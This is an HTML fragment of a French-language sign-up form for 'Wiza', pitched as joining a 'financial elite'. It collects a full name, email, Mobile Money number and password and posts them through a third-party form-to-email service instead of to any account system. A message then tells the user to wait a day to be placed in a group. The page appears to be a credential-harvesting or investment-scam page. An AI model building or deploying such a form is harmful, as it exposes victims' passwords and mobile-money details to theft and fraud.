<body>
<div class="container">
<form  id="contact-form"  action="https://api.web3forms.com/submit" method="POST" class="glass-form">
    <input type="hidden" name="access_key" value="8ced0072-2b9f-4238-b474-663de19e1aac">

    <h2>Créer un compte <span class="accent">Wiza</span></h2>
    <p class="subtitle">Rejoignez l'élite financière en quelques clics.</p>

    <div class="input-group">
        <i class="fas fa-user"></i>
        <input type="text" name="nom" placeholder="Nom complet" required>
    </div>

    <div class="input-group">
        <i class="fas fa-envelope"></i>
        <input type="email" name="email" placeholder="Email" required>
    </div>

    <div class="input-group">
        <i class="fas fa-phone"></i>
        <input type="tel" name="tel" placeholder="Mobile Money" required>
    </div>

    <div class="input-group">
        <i class="fas fa-lock"></i>
        <input type="password" name="pass" placeholder="Mot de passe" required>
    </div>

    <input type="hidden" name="redirect" value="index1.html">

    <button type="submit" class="btn-submit">
        <span>S'inscrire</span>
        <i class="fas fa-arrow-right"></i>
    </button>

    <p class="footer-text">Déjà membre ? <a href="index1.html">Se connecter</a></p>
</form>
<div id="success-message" style="display: none; text-align: center; color: white; padding: 20px;">
    <i class="fas fa-clock" style="font-size: 3rem; color: #00d2ff; margin-bottom: 20px;"></i>
    <h2 class="accent">Demande reçue !</h2>
    <p>Merci de patienter 1J pour vous mettre dans un groupe. Une note vous sera envoyée sur votre email.</p>
</div>
